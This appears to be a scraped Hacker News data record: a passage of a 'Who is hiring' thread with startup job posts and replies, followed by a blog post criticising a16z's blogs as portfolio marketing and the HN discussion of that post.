humanity makes more breakthroughs in every domain: from climate change to the gut microbiome to longevity and economic policy. We’ve scaled to over 200,000 monthly users by word of mouth and just crossed $1MM in annual revenue, 5 months after launching subscriptions. We’re now building out the core software engineering team. Apply at https://elicit.com/careers?gh_jid=6920548002 reply just_mc 15 hours agoprevRyzyliantRemote (US) or Onsite (Birmingham, AL)Senior Software EngineerFull-timehttps://ryzyliant.com Our mission is to save lives by streamlining the 911 emergency response workflow. Ryzyliant provides solutions for 911 Call Centers (PSAPs) in the United States. Existing PSAP solutions in the US are generally comprised of very poorly integrated systems from several different vendors all of which must be used in parallel to complete the emergency dispatch process. Imagine having your IDE on one computer, your email client on another and your browser on yet another and there is an emergency in progress; this is the work environment of dispatch operators in the US. Our mission at Ryzyliant is to provide a unified and streamlined tool that is designed to facilitate the end to end workflow of the dispatch operator, speeding dispatch operations and reducing errors. We are using leading edge local-first browser applications to provide the benefits of the cloud with the stand-alone survivability of traditional on-premise solutions. We are seeking one or more Senior Developers who have some or all of the following skills: - Advanced TypeScript - Design patterns and best practices for TypeScript/JavaScript - Object-Oriented Design - Automated testing (Vitest) Specific skill which are nice to have: - Communications Technologies (WebRTC, SIP, RTC, WebAudio) - Web Mapping / GIS - Progressive Web Applications and/or Web Workers - Browser Local Persistence (eg. IndexedDB, Origin Private File System) Ryzyliant offers the following benefits: - Flextime and Remote work - Early-Stage Equity - Two Weeks Vacation Find more details in the link below. Apply Here: https://ryzyliant.com/careers/ Email: jobs at ryzyliant dot com reply richard_pepper 13 hours agoprevSpiceFull TimeOnsiteSan FranciscoUS Authorized Onlyhttps://spicedata.com/ - The world's largest companies are buying more external data - We license data to leading F500 enterprises - Our product is not a particular dataset, but rather the ability to quickly collect, clean, and reliably provide high-quality data over time - We're currently focused on the restaurant industry - Raised only from YC and a couple angels - Profitable We're hiring a Founding Product Associate: https://www.ycombinator.com/companies/spice/jobs/QwfZ6Qw-fou... reply sashank_1509 11 hours agoprevAIM Intelligent Machines (aim.vision)In personFull - time (40 hours)Seattle, Redmond Area. We are hiring junior and senior engineers to work on an autonomous bulldozer. We would like experience in one or many of deep learning, computer vision, reinforcement learning, model predictive control and robotics. We are based in Redmond, Washington, it would be a bit of a long commute from Seattle (~1hr) so we recommend people to join from Redmond, Bellevue area). We are open to remote for the right candidate. reply dencodev 9 hours agoparent\"Forward Deployed Engineer\" is on your website and links to LinkedIn, but it's listed as not accepting applications there. Your company is awesome, I tinkered with something exactly like this but with a little plastic RC excavator. I'm a web developer but probably not a competitive candidate. Just wanted to say \"cool!\" reply sashank_1509 2 hours agorootparentInstead of LinkedIn just mail career@machines.run. We closed linkedIn because we were getting 100+ applications every day and many of them low quality (no idea what our company does etc). Feel free to mail us, we’re hiring for a lot of roles! (Including Forward Deployed Software Engineer) reply wiggin77 9 hours agoprevMattermostSenior Software Design EngineerUS RemoteFT$127,000 - $170,000 Mattermost provides secure, workflow-centric collaboration for technical and operational teams that need to meet nation-state-level security and trust requirements. We serve technology, public sector, national defense, and financial services industries with customers ranging from tech giants to the world’s largest banks, to the U.S. Department of Defense and governmental agencies around the world. We’re looking for a senior software design engineer who can work collaboratively on a fast-paced team, wants to own their projects end to end, and can find creative solutions to solve hard customer problems. Someone who can build custom software solutions, such as Mattermost plugins, for top customers using Go, Postgres, Typescript/React. For details and to apply, visit: https://jobs.lever.co/mattermost/baab2878-c4c4-495a-acd2-685... reply calhat 12 hours agoprevSpill (https://www.spill.chat/)Fullstack Engineer (£65-80k)London, UK (HQ)ONSITEFull-time Our aim is to make counselling and therapy free at the point of use for as many people as possible. We do this by selling a mental health support product to businesses. We're hiring a Mid-Level Fullstack Engineer into our small product and engineering team of 8. We're a small product-focused company, we don't employ any salespeople, and we are cashflow positive. email calvin[at]spill[dot]chat for a more thorough job spec reply kpdoumbia 14 hours agoprevCanvas (The Spatial Computing Company)Full-timeOnsiteRemoteAt Canvas, we’re working on spatial computing - using computer vision to 3D reconstruct and understand your surroundings so that software can operate over real-world spaces. We believe it will power the next generation of augmented reality and some of the key parts of virtual reality as well. Senior Web Backend Engineer (Python) - Portugal or RomaniaWeb Backend Engineer (Python) - Portugal or RomaniaInside Sales Representative - Remote North America For detailed information check out https://canvas.io/jobs. Keywords: 3D, computer vision, photogrammetry, geomatics, SLAM reply jitolabs 10 hours agoprevJito LabsSr. Software Engineer -- Low-Latency SystemsRemote (US)Full-timewww.jito.wtf$200-$240k approx Jito Labs is seeking a senior engineer to build the future of MEV and block building on Solana. We are looking for a creative and motivated engineer that can effectively wrangle problems with large design spaces and come up with simple and elegant solutions. Responsibilities: - Dive deep into the world of MEV and on-chain trading, understanding the end-to-end flow of transactions through the Solana network - Collaborate with the team and customers to build higher performance, cutting edge features - Comfortably deep dive into performance bottlenecks and debug problems across the entire stack Qualifications: - 5+ years of systems programming experience writing code in Rust, C, or C++ - Familiar with low latency, high performance and high reliability programming - Excited to dive into tricky problems and using tools like valgrind and gdb to debug software problems - Ability to balance the engineering-time tradeoff between perfect and good enough - Worked at a 50% of all AI apps inside a company. Prior to elvex, our founding team (4 people currently) launched, scaled and sold Parse.ly to Automattic in their largest ever acquisition by cost and revenue (Automattic makes and maintains WordPress). We’re looking to hire our next Senior Product Engineer. Senior Product Engineers are full-stack at elvex and are given a lot of autonomy to solve both customer and engineering-oriented problems directly. If you join us, you’ll be employee number 5 overall and will have big impact on the trajectory of the company, culture and product. We are working with a host of very large B2B customers and solving real problems for them with our platform and looking to commercialize later in 2024. You should be an expert in web app development with deep familiarity with one or more of: Django/Flask/FastAPI and React/Vue/Svelte. You should also love playing at the very edge of innovation as that’s where we are with generative AI at the moment. Is RAG the killer gen AI use case? Is the best UI we can do really just chat? How do we move beyond cool prototypes to production-scale use cases? Apply via https://careers.elvex.ai/jobs/32372-senior-product-engineer or email me mike@elvex.ai with any questions or if you wanted to add a personal note. (Note: we're aware that the footer on this page uses boilerplate copy, it's an issue with our applicant tracking system). reply cyanoacry 13 hours agoprevEsperto Medicalhttps://esperto.healthLos Angeles AreaHybrid In-officeSenior FPGA/Firmware Engineer We're building a medical device that allows us to measure BP continuously, in real time. (We're a Caltech spin-out and found some new physics that we want to get to market.) Desires: - Experience with FPGAs / FPGA integration - Experience with Linux on an embedded system - Have dealt with real-time systems - Experienced in Rust / Python .. but honestly, if you can tell me what a GPIO is and how it relates to the userspace I/O driver, we'll probably get along. Here's the official job listing: https://esperto.health/careers/sr_firmware.html If you think this is interesting, email me, I'm the CTO: raymond.jimenez@esperto.health reply selimthegrim 12 hours agoparentHi Raymond, your first link Esperto.medical isn’t working. I also sent an email about the algorithms engineer position on your site if you want me to CC you too. reply cyanoacry 11 hours agorootparentThanks, updated! Please do CC me, as then I can vouch for where you came from :) reply andjosh 13 hours agoprevAnduril Industrieshttps://www.anduril.com/Costa Mesa, CAFull TimeMultiple Roles Anduril Industries is a defense technology company with a mission to transform U.S. and allied military capabilities with advanced technology. By bringing the expertise, technology, and business model of the 21st century’s most innovative companies to the defense industry, Anduril is changing how military systems are designed, built and sold. We are hiring for MANY roles. - Software Product Manager https://boards.greenhouse.io/andurilindustries/jobs/43216090... - Senior Full Stack Software Engineer https://boards.greenhouse.io/andurilindustries/jobs/42728720... - View hundreds more at https://www.anduril.com/open-roles/ reply rnDFN 12 hours agoprevDFINITYUS/Remote, Zurichhttps://www.dfinity.org Our mission is to develop technology that supports the next generation Internet Computer network and ecosystem. The Internet Computer is a general purpose blockchain that can replace traditional IT and host a new generation of applications and services that can run 100% on-chain without the need for traditional IT. The DFINITY Foundation was founded in 2016, has raised over $150mm from top-tier institutions including Polychain Capital and Andreessen Horowitz and has attracted over 200 of the top computer scientists, researchers, engineers and operators in the world. Some select roles: Developer Relations Engineer (Zurich) - https://grnh.se/7164271f2us Front End Software Engineer (Zurich) - https://grnh.se/3b93f4ee2us Senior Software Engineer, Systems (Zurich) - https://grnh.se/60b0bc792us Software Engineer, Node Engineering (Zurich) - https://grnh.se/f76e2b0f2us Software Engineer, Node Engineering (US, Remote) - https://grnh.se/944d29fd2us reply enthoughtjobs 14 hours agoprevEnthoughtPython Scientific Software DevelopersHybridTokyo, JP www.enthought.com/careers Enthought powers digital transformation for science. Our technology and deep scientific expertise enable faster discovery and continuous innovation. We solve complex problems for the most innovative and respected organizations across the life sciences, material sciences, chemical, and semiconductor industries. Competitive salary, stock options reply fadeladib 14 hours agoprevCartesian Systems (MIT Startup)Senior Software Engineer - Mobile (Android)Boston (on-site)Full-time I’m the CEO of Cartesian Systems, a seed-stage MIT startup on a mission to map the physical world at unprecedented scale and precision. Our team brings together world-class technical expertise and startup experience, and we’re building a first-of-its-kind product to solve problems in indoor logistics for retail and supply chain. As we gear up for our product launch (and scaling) this year, we’re looking to hire a senior software engineer to lead our mobile development (native Android) and amplify mobile development velocity. By joining the team at this stage, you’ll play a foundational role in shaping the product and company culture. More information about the opening and how to apply here: https://jobs.polymer.co/cartesian-systems/29986 reply jesalg 14 hours agoprevthoughtful.aiStaff Full Stack EngineerREMOTE (USA only)Full-time$190-250k + early equity, FTE #15 - 20 We are a small Health Tech / AI automation start-up growing 3x YoY and looking to expand our platform team. Our core platform consists of a front-end app, back-end API, SDK, and some DevEx tooling. The tech stack consists of AWS, Typescript, NextJS, React, Python, Go, and the Serverless Framework. Your voice and expertise will significantly impact our platform’s strategic direction and development. If that sounds exciting to you, apply on our website (we review every submission): https://www.thoughtful.ai/job?gh_jid=4354328005 I'm the HM for this role. If you want to learn a bit more about me, you can go to https://jes.al/ reply xandrius 12 hours agoparentHello, would you accept remote applicants from outside the US but with everything already setup to start working? This field and position is literally what I am looking for :D reply vero_replit 14 hours agoprevReplitHybrid - Foster City, CAFull-Time Current hiring priorities include: * Product Engineer * Technical Lead, Product Engineering * Software Engineer, Workspace Infrastructure * Product Designer * Product Designer, Growth * AI Engineer See these opportunities and more below: https://jobs.ashbyhq.com/replit?utm_source=HackerNews reply koenbok 12 hours agoprevFramer (https://framer.com/)Remote (Europe)Full-time Senior frontend / backend engineers: TypeScript, React, Go, AWS. koen at framer dot com reply seth_ 14 hours agoprevRiffusion - Generative AI for MusicResearch Scientist, Research EngineerSan FranciscoFull-time Riffusion is a small team training foundation models for music generation and building products that create more musicians in the world. We strive to create and deploy models that are expressive, fast, controllable, and inspiring at scale. We’re establishing our founding research team and looking for individuals who love music and are excited to build a more creative future with us. Experience with large scale generative model training and diffusion architectures is preferred. Very strong software engineering and computer science fundamentals required. We’re backed by top investors and have substantial compute at the ready. You can make music with us https://riffusion.com and reach me at { seth at riffusion dot com }. reply esafak 14 hours agoprevArchipelago AI (https://archipelago-ai.com/)Front-end engineerContract-to-hire but no agencies for nowPart-time possibleRemote We are dedicated to improving distributed work through better communication tools. More productive, and more conducive to forming the social ties that we associate with face-to-face interaction. We are hiring a front-end engineer to help build our new communication platform. Must know Typescript, Websockets, modern frameworks (we use Svelte, and Astro), and how to write testable code. Ideal candidates will be versed in UI/UX, web- and interaction design. We're early stage, so you will have the opportunity to flex all your skills. Kindly send your resume and design portfolio, if you have one, to hiring+hn@[domain] reply amacneil 13 hours agoprevFoxgloveRemote (must be located in US time zone)Full Timehttps://foxglove.dev/ Foxglove is the leading observability platform for robotics developers. We help robotics and autonomous vehicle companies log, ingest, organize, and visualize multimodal data. We're well funded (Series A, ~20 people), with an experienced and fast-moving team. Seeking like-minded people to join us! - Lead Infrastructure Engineer - Senior / Staff Backend Engineer (TypeScript, Node.js, bonus if you have experience with Rust, Go, C++, Python) - Head of Design (not listed but email me) https://foxglove.dev/careers Email adrian@foxglove.dev if you have questions (no recruiters please). reply minaguib 14 hours agoprevHivestackData Discipline Lead (Senior/Staff-Level Position)Montreal, QC (Hybrid Office/Remote)Full Time Industry: Adtech, specializing in Digital Out Of Home We are hiring a senior data engineer to lead our data discipline - this includes driving the architecture and technical roadmap, and the implementation of various technologies to support adtech-scale ingestion, transport, processing, warehousing, and reporting. Full job description: https://boards.greenhouse.io/hivestack/jobs/4341464006 If you enjoy big (and small) data, get in touch :) (contact info in bio) reply bmcahren 10 hours agoprevSKULabs (https://www.skulabs.com)Full-Stack Developer (Node.js, React)South FloridaONSITE100k-160kFull-time Salary We're looking for additional Node.js and React developers to join our team. SKULabs helps ecommerce companies scale their operations with ease. Join us as we scale out exciting new products and scale up our core product. We're fully self-funded and profitable, no runways in sight. Health/vision/dental/life insurance. On-site gym, basket ball court, pickle ball court, espresso machine, in an awesome space right off of the Saw Grass Expressway. https://jobs.lever.co/skulabs/338dd628-5281-4423-bad7-6b68e7... SKULabsUX Engineer & UI DesignerSouth FloridaONSITE100k-160kFull-time Salary We're looking for someone to take ownership of our UI. You'll build upon a robust Figma and Storybook covering our components, page flows, marketing designs, and you may be called on to help with some occasional lead capture pages and occasional ad design work our non-tech teammates can't complete on Canva. Try our app at www.skulabs.com/inventory for a preview of what you'll work in based on Next.js and MUI. Health/vision/dental/life insurance. On-site gym, basket ball court, pickle ball court, espresso machine, in an awesome space right off of the Saw Grass Expressway. https://jobs.lever.co/skulabs/408ce2cc-31ea-4911-87e0-dacff5... SKULabsContent Producer / Social Media ManagerSouth FloridaONSITE80k-130kFull-Time Salary Help us produce and supervise the production of new content using our in-house studio. We have a huge content calendar lined up for 2024 and are actively producing content in-house. We have DJI mics and mostly use our phones but we're open to whatever hardware you suggest. We need to start capturing content for our daily processes like hardware stress testing, day-in-the-life style content, warehouse optimization, and more. Health/vision/dental/life insurance. On-site gym, basket ball court, pickle ball court, espresso machine, in an awesome space right off of the Saw Grass Expressway. https://jobs.lever.co/skulabs/cb732bcf-a2bc-420e-b151-d0b4f4... reply ajrpop 12 hours agoprevHey all! I'm Allisyn, recruiting lead @ Proof of Play (proofofplay.gg) developing player-focused games on the blockchain. We're looking to add to our Engineering team in a big way: Senior Front-End Engineer (https://jobs.ashbyhq.com/proofofplay/0a26bcd9-3db1-486e-bc87...) Lead Tools/Engine Engineer (https://jobs.ashbyhq.com/proofofplay/67a5220f-2c7b-486c-acf5...) Senior Blockchain Engineer (https://jobs.ashbyhq.com/proofofplay/8e9ad5b7-490e-404f-8e35...) Senior Fullstack Engineer (https://jobs.ashbyhq.com/proofofplay/c37b5f94-aa38-4f9f-a4ba...) Not seeing anything that fits you? We still want to hear from you and why you're interested in our mission via our Open Applications! (https://jobs.ashbyhq.com/proofofplay/e91d7c94-ad95-4106-adaa...) Thanks! reply obeavs 15 hours agoprevHiring: CTO (to take reins from solo, technical founder) PHOSPHOR (http://phosphor.co/20x) has been reverse-engineering ISDA, which financial historians refer to as “the greatest success story in modern economic history” due to ISDA's ability to drive standardization into financial contracts which enabled their markets to grow 1200x. We're doing this in the internet age by modeling Github as the center of the open source world. But to build something like Github, we had to build languages, version control, IDEs, and infrastructure for contracts and financial models (the backbones of every asset class in finance) to make them computable and connectable. I've been building Phosphor for over three years as both CEO and CTO. As we've really honed in on what we're doing as a business, how/where we innovate, etc, I need someone experienced to take the reins and help me grow this company into the ridiculous opportunity it represents. You might be a fit if: - You're demonstrably obsessed with HCI and end-user computing - You’ve lost sleep thinking about knowledge abstraction problems - You’ve built CRDTs and collaborative applications for fun - You're design-oriented, but as speed is a UX problem, you’ve learned systems languages - You’re excited by the emergence that occurs when AI is applied against observable systems - You're excited to - You’re a polyglot, and maybe frustrated that functional languages aren’t the norm - You have an expansive model of the world, and the idea of consolidating these skills to create extraordinary real-world impact excites you - You're deeply technical, but have also built capable teams What you’ll do: - Build one of the most unique products in finance - Inherit a three year old, thoughtfully architected, event-driven application with only minor tech debt - Build a 5-10 person engineering team - Kick off/manage all of the bits and pieces that go into such a ridiculous endeavor This is a very hard technical problem at every level (low level up through design) which we've made extraordinary progress towards. We have traction and investment from leaders in clean energy finance (where I built one of the leading solar platforms as first hire), real estate, and more. To apply, email oliver@phosphor.co with \"CTO position\" in the title. Include a PDF of your resume, links to LinkedIn/GH, and lay some bullets that point to awesome you've done or built before that match the bits and pieces of the \"You might be a fit if\" section. Cheers. reply guhcampos 13 hours agoparentThis is very very very interesting work. I had a similar feeling and ideation about Law and legislation before, and envisioned a World whee laws could be written in a syntactically structured language and then formally verified to fix, prevent and elaborate new rulings, eliminating ambiguity and creating the same type of standardization you describe. Then I got severely discouraged by every single lawyer friend I have as an impossible task, both technically (which I disagree, it still sounds perfectly reasonable to me) and most importantly: politically. There would be no interest from real world actors in this, because all of them profit exactly on the ambiguity of the law. I'm genuinely curious to understand why that would not be the case here, and ISDA's case seem to be a good inspiration. reply elijah_smith 13 hours agoprevApollo AgricultureEngineering & DSFull-timeAmsterdam, NLhttps://www.apolloagriculture.com/team Apollo Agriculture (YC F1) is bringing modern farming to the world's poorest farmers. Millions of farmers globally don't have access to the basic resources the rest of the world depends on for food production: good seed and fertilizer. We sell these on credit, use ML to figure out who we can lend to profitably, and are growing rapidly (two countries and growing). We are a small, motivated team with SV roots and an ownership culture. Come help us make a real difference in the world! Hiring for several roles: - Software Engineer: Our core engineering team supports a wide range of tools and processes. Our primary stack is Scala 2 w/ cats, backed by psql. If you are an experienced and practical problem solver, we'd love to meet you. - Machine Learning Engineer: We build and run several different models to determine credit eligibility, detect fraud, etc. Our ml engineers are hands-on and provide production-ready models for other teams to consume. ... due to our size and focus, we look for candidates who are experienced and can be autonomous -- at least at the \"senior\" level. Visa sponsorship is possible! Drop me a line at elijahsmith@apolloagriculture.com if you're interested; I'm happy to chat. reply smilliken 14 hours agoprevMixRank (YC S11)Software Engineers100% REMOTE (Global)Full-Time MixRank processes petabytes of data every month from web crawling. We have hundreds of customers using our data products including Google, Amazon, Facebook, Intel, and Adobe, across industries Sales, Marketing, Finance, and Security. Team is 41 full-time, full-remote from 20+ countries. We're growing, profitable, employee-owned, no dependence on outside funding. Applicants from all geographies and backgrounds are welcome. We are looking for passionate individuals for whom programming is not just a job but it’s something they love to do. We're obsessed with computers, programming, big data, databases, compilers, hardware, math, data science, and the internet. Does this sound like you? Please apply to join our team. Our code base is very friendly to new contributors. You'll have a fully-functional development environment within hours (fully automated) and be pushing commits on your first day. Deployments to production happen multiple times per day and finish in less than 2 minutes. Effectively all of our codebase is written in Python, Rust, SQL, Javascript/TypeScript, and Nix. The core technologies you'll need familiarity with to be productive are Python, PostgreSQL, Linux, and Git. We operate at a larger scale than typical startups. We operate two datacenters with high performance servers we've built that are capable of dealing with the volumes of data we process. We've implemented our own distributed file system. We do full-scale web crawls. We download and perform static analysis on the entire universe of Android APKs and iOS IPAs that are published. Unlike a typical startup where you'll spend half of your time in meetings, and the other half fixing bugs from Jira tickets— at MixRank you'll get to challenge yourself with difficult technical problems that will help you to grow as an individual. -- Junior Software Engineer - Remote (Global), Full-Time We're looking for remote junior engineers that have 0-3 years of professional experience in software, and 5+ years of curiosity exploring computers, programming, and technical hobby projects. This is an open-ended entry role with mentorship and diverse opportunities to work on all areas of our product: databases, distributed systems, infrastructure and tooling, data analysis, machine learning, frontend/backend web development, APIs, data mining, data modeling, and more. To stand out, please highlight what makes you unique: passion for computing, curiosity and side projects, work ethic, niche research, etc. Ideally you've already graduated, but if you still have one or more years left of school, please feel free to apply anyway, and if you're the right fit for the team we'll figure out a way to accommodate your schedule. -- Software Engineer - Remote (Global), Full-Time We're hiring generalist software engineers to work on web applications, data mining, machine learning/data science, data transformation/ETL, data modeling, database scaling, infrastructure, devops, and more. We'll cater the role to whatever subset of these areas match your interests. Beneficial experience includes PostgreSQL, Python, Rust, Linux, TypeScript, Nix, frontend/backend web development, and data mining. -- I'm Scott, Founder/CEO/CTO. Please apply here: https://www.ycombinator.com/companies/mixrank/jobs reply khyati_bardolia 8 hours agoparentInterested to work as a Frontend engineer with 4+ years of experience specialising in ReactJs and VueJs technologies. reply powertoolstech 15 hours agoprevPowertools TechnologiesJunior/Senior EngineerLisbon, PortugalFull-timeONSITE > Looking for a senior engineer for work on software related to Electronic Design Automation. Candidate should have some experience with EDA software (Cadence Virtuoso, Siemens Calibre, Synopsys Design Compiler, etc), ideally including plugin development. Experienced Software Developers are more than welcome to apply. > Looking for a junior engineer for work on software related to Electronic Design Automation and/or Software Development. Candidate should at least have (or graduate shortly) a 3 year university degree in engineering. Most suitably Electronic/Computer Engineering or Informatics. Software Developers are more than welcome to apply. Site: https://www.powertools-tech.com . Growing a small experienced team with international industrial and academic track, willing to train new hire in fairly uncommon skill set. Candidate should be capable of quality detail work, and have good communication abilities, to provide support to international design teams in fabless semiconductor companies. Email your interest and CV to hr@powertools-tech.com, please. reply ThomPete 14 hours agoprevFaktoryFull TimeRemote/On-site (New York, US)https://www.faktory.com Faktory is building the worlds biggest, smartest and most reliable AI workforce. Your objective is to help make sure our ai agents become ever smarter, more reliable an and that new ones can be created via our Agent Studio platform. Our aspirations are high, so your obsession with everything AI and agents will will have to bee too :) Here are a few of the roles we want to hire for: * Senior Developer * We are currently looking for a developer who live and breath AI/LLM/Python * Prompt Engineer * Are you AI whisperer of prompting? Then we most definitely would want you. You need to have some basic technical understand if you are a developer it's a plus. * Frontend Developer * You are king of vanilla javascript and kind of don't like framework but understand react. Please write us at apply@faktory.com reply braveheart1723 11 hours agoparentyou have typo on your homepage, `No code or complicated intergration is required. Faktory works out of the box.` should be: `integration` reply ThomPete 6 hours agorootparentThanks! Fixed. reply 14 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A job board is available for companies hiring for remote or on-site positions, restricting posts to hiring companies only.",
      "Readers are advised to email only if personally interested in a job, with various resources for job seekers and links to related threads."
    ],
    "commentSummary": [
      "Tech companies worldwide are recruiting for roles like Software Engineers, Product Managers, and Machine Learning Engineers with lucrative salaries and career advancement prospects.",
      "Proficiency in technologies like Python, React, and Vue.js is essential, with opportunities in areas like security, AI, blockchain, and health tech.",
      "Job seekers can explore openings for remote, hybrid, or on-site work on designated websites, offering diverse and exciting professional paths."
    ],
    "points": 275,
    "commentCount": 264,
    "retryCount": 0,
    "time": 1711983656
  },
  {
    "id": 39901289,
    "title": "A16Z's Blog: Questioning Transparency in Tech Marketing",
    "originLink": "https://frankzliu.com/blog/a16z-blogs-are-just-glorified-marketing",
    "originBody": "a16z Blogs Are Just Glorified Marketing Jun 20, 2023 • Frank Liu Share on: … glorified marketing for portfolio companies, that is I came across one of a16z’s blog posts on Hacker News today, titled Emerging Architectures for LLM Applications. For folks who didn’t catch it, here’s the tl;dr: The emerging LLM stack is composed of several elements centered around data orchestration tools such as Langchain and Llamaindex. Data pipelines, embedding models, vector databases, and queries form the primary input for these orchestration tools. The stack is based on in-context learning, where off-the-shelf LLMs are used and their behavior is controlled through prompting and conditioning on contextual data. Strategies for prompting LLMs are becoming increasingly complex and are a core differentiating factor for both closed-source and open-source LLMs. Of these LLMs, strategies for GPT-3.5 and GPT-4 are most common, seeing as OpenAI is the current leader. AI agents - programmatic runtimes that can reason and plan - excite both developers and researchers alike, but don’t work just yet. Most agent frameworks are currently in PoC phase. Overall, I thought the article was informative, but I was surprised that the section on vector databases mentions neither Milvus nor Zilliz, especially since Milvus was mentioned in an older a16z blog on data and ML infrastructure: Also of note: another Zilliz project (GPTCache) is listed in the post. My initial instinct was that Milvus was left off because it is part of the LF AI & Data Foundation rather being a project wholly owned by Zilliz, so I left a comment on the HN post that links back to the Milvus website. I came back a couple of hours later to find an interesting take: Full disclosure: we (Zilliz) raised 103 𝑀 𝑏 𝑎 𝑐 𝑘 𝑖 𝑛 2022 , 𝑎 𝑛 𝑑 𝑃 𝑖 𝑛 𝑒 𝑐 𝑜 𝑛 𝑒 𝑟 𝑎 𝑖 𝑠 𝑒 𝑑 100M this April. Running it back in my head, I felt that SheepHerdr’s response actually made excellent sense - a16z’s ultimate goal is to generate returns for LPs, and the best way to do that is by supporting founders and propping their portfolio companies. To me, this is also unequivocally unfair to Vespa, Weaviate, etc as it delivers a subliminal message that they have no realistic long-term chance in the vector database space relative to Pinecone. This, of course, is absolute nonsense: vector databases are NOT a zero-sum game. I dove a bit deeper and was surprised to find that this is fairly commonplace behavior for a16z as a firm: The aforementioned article also lists Databricks in the “Data Pipelines” section, but not Snowflake. There is a Snowflake loader for Langchain and a guide for using Llamaindex with Snowflake. Databricks is an a16z portfolio company. The Modern Transactional Stack doesn’t come close to listing all of the available data connectors. To be fair, Airbyte and Fivetran (an a16z portfolio company) are the two largest and most well-known, but to distill the entire segment to just two companies seems unfair. a16z’s crypto division has backed LayerZero, going as far as actively voting against Wormhole, a LayerZero competitor. Side note: LayerZero was also featured in a16z’s Crypto Startup School. These are just three random examples I dug out - there are probably many other examples in verticals that I am unfamiliar with. Other LLM/GenAI Infrastructure landscapes Here’s a couple alternative landscapes that are, in my eyes, more wholly representative: ML/AI/Data Landscape (Interactive version). Matt Turck’s MAD Landscape is arguably the most complete out there. Companies that do vector search are listed under “Infrastructure/Vector Database” and “Analytics/Enterprise Search” categories. It was released in February 2023 so it’s about 4 months old, but a good resource nonetheless. Future of AI-Native Infrastructure. This one’s from Wei Lien Dang and David Hershey of Unusual Ventures. I found this pretty unique as it has a vertical for AI agents. It’s unfortunately not as complete as the MAD Landscape (missing Vespa, Vectara, etc), but still a good overview. The New Language Model Stack. Sequoia Capital’s blog post on the LLM stack is also excellent. Milvus isn’t in the diagram, but it’s mentioned in the section on vector databases. Vector Database Landscape. Yingjun Wu’s infographic is centered specifically around vector search infrastructure. Final thoughts I have tremendous respect for a16z, a firm that helped pioneer the practice of working with and nurturing founders rather than forcing them out pre-IPO or minmaxing term sheets. Their content is also incredibly informative and valuable for understanding the nuances of building a company, from finding PMF to hiring executives. I also wholeheartedly understand a16z’s motivation for sharing knowledge and highlighting their portfolio companies, but to do so under the guise of being helpful and impartial is just plain silly. In particular, a16z’s blog post yesterday has as much to do with emerging strategies for portfolio company marketing as it does with emerging architectures for LLM applications. This practice would be somewhat analagous to Google putting paid URLs at the very top of search results without an “Ad” label. (To be clear, Google doesn’t do this.) I’d like to end with some glorified marketing of my own: % pip install milvusNext Post Vision Transformers are Overrated",
    "commentLink": "https://news.ycombinator.com/item?id=39901289",
    "commentBody": "A16Z blogs are just glorified marketing (frankzliu.com)224 points by herecomethefuzz 8 hours agohidepastfavorite114 comments gen220 7 hours agoMost \"news\" in the tech industry is funded by VCs, if you follow the money. It's not a terrible fact, but it's one to be aware of. All the `\"X Technology\" [that Y VC firm has recently raised $4Bn of capital to chase, cough cough] has massive potential to upend [big industry], here's why` articles are compensated-for boosterism. There's still signal in there, although it's mostly in the meta-facts of what they choose to talk about and what they choose not to talk about. reply strken 1 hour agoparentThis becomes very obvious when you turn up to a conference and half the talks are by developer advocates running you through their product. reply pclmulqdq 7 hours agoparentprevWhen you compare the press coverage of \"X VC-backed startup with product A\" to \"Y bootstrapped startup with product A,\" it's sort of evident how corrupt startup media actually is. Taking it at face value is not usually a good idea. reply xmprt 5 hours agorootparentThere's only so much money you can make off of banner ads and at a certain point native advertisements are way more lucrative. I wonder how they get around disclosure requirements but I guess it's probably because the articles are never directly funded but there's some other form of compensation in the backend. Tom Scott made an interesting video about internet advertising regulations a while back. [1] [1]: https://www.youtube.com/watch?v=L-x8DYTOv7w reply StressedDev 2 hours agorootparentWhat is native advertising? reply bloak 2 hours agorootparentI wasn't familiar with the term, either, but it's in Wikipedia: https://en.wikipedia.org/wiki/Native_advertising reply zug_zug 7 hours agoparentprevI'm about as interested in Andreesan's take on company's they own/copmete-with as I am in Zuck's take on apple vision pro. reply dgellow 1 hour agorootparentZuckerberg’s take on Vision Pro was pretty interesting reply squokko 2 hours agorootparentprevZuck's take on the Apple Vision Pro is mostly aligned with my own (disinterested) take, having tried both the Quest 3 and Apple Vision Pro. reply hackernewds 6 hours agoparentprevwhy not. verve has revenue in the millions, and can move private market perception by millions so there's both desperation and incentives reply chaostheory 2 hours agoparentprevIt extends beyond the tech industry. https://paulgraham.com/submarine.html reply henry2023 7 hours agoprevNot all of them are marketing. Some of them expose his belief system. After “The Techno-Optimist Manifesto” it’s very hard for me to take him seriously again. reply kevinmchugh 6 hours agoparentAbout four years ago Andreesen published this: https://a16z.com/its-time-to-build/ They were and remain big crypto investors and it's pretty weird that the essay doesn't acknowledge how much talent and money crypto sucked up. He asks where the supersonic aircraft are and - ignoring that they have awful externalities - there is actually a supersonic jet startup. A16Z hasn't invested in Boom, though, near as I can tell. A16Z is a leading venture fund - if anyone's gonna build the future, they could use A16Z's money. So why is so much of what Andreesen wants from the future not what they've invested in? reply nyokodo 5 hours agorootparent> there is actually a supersonic jet startup. A16Z hasn't invested in Boom, though, near as I can tell. A quick review of their website and some cursory googling reveals that while boom is not in their portfolio they have invested in a company developing a super sonic jet engine technology (Astro Mechanica) [1] as well as a company producing precision machine parts for aerospace (Hadrian) [1] and various other companies that intersect with the area. [3] Perhaps they wanted to invest in Boom but the deal wasn’t right or they are skeptical of that particular company or they simply never got the chance but clearly they are putting their money into this area and it’s worth researching before judging them. 1. https://www.notboring.co/p/astro-mechanica 2. https://www.hadrian.co/ 3. https://a16z.com/portfolio/ (Look under American dynamism) reply juitpykyk 2 hours agorootparentprevNever forget the video where Marc was asked what is Web3 and he spent 5 minutes talking gibberish nonsense. reply lenerdenator 6 hours agoparentprevif there's one thing that we've learned over the last eight or nine years, it's that you don't have to be taken seriously by most people to have an impact. reply vundercind 7 hours agoparentprevOh wow, I forgot about that! What a wild read. It was such a mess. I loved it. Something about a famous rich person putting that much effort into something so amateurish and clumsy, while apparently being so confident, in an eager-college-freshman sort of way… I dunno, call it endearing, maybe. I mean it’s either that or it’s horrifying. I choose to pretend it’s endearing because there’s too much horrifying already. reply dools 7 hours agorootparentIt's horrifying because it's not an isolated wild rich man seizure, it's the same shit that Musk, Dorsey et al believe. The whole effective altruism movement is infected with this bizarre space feudalism. reply margalabargala 6 hours agorootparent> The whole effective altruism movement is infected with this bizarre space feudalism. This is basically what 